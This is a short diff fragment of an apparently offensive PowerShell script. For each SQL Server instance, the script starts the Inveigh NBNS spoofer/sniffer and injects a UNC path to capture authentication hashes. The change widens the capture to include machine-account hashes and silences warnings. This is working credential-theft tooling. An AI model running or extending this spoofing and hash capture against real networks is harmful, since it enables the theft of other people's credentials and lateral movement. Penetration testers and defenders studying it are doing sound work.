@@ -50,7 +50,7 @@ ForEach-Object{
     Write-Output "$CurrentInstance ($CurrentInstanceIP) - Starting sniffer"
 
     # Start the sniffing
-    Invoke-Inveigh -SpooferHostsReply $CurrentInstance -NBNS Y | Out-Null 
+    Invoke-Inveigh -SpooferHostsReply $CurrentInstance -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null 
 
     # Start unc path injection for each interface
     Write-Output "$CurrentInstance ($CurrentInstanceIP) - Injecting UNC path"
